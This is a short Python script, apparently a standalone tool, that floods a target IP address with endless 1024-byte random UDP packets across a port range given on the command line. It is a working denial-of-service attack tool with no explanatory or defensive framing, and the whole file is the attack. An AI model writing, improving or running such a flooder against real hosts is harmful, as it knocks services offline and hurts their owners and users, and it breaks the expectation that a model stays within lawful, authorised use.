#import socket
from socket import socket, AF_INET, SOCK_DGRAM
from random import _urandom
from sys import argv

def udp_flood(ip, port_range, verbose = False):
    S = socket(AF_INET, SOCK_DGRAM)
    start = int(port_range[0])
    end = int(port_range[1])
    j = 1

    while 1:
        [S.sendto(_urandom(1024),(ip,start)) for start in range(start,end)]
        if verbose: print('Flooded ports %d - %d, %d times' % (start, end, j)) 
        else: continue
        j += 1 

    return
if __name__ == "__main__":
    udp_flood(argv[1],[argv[2],argv[3]],True)
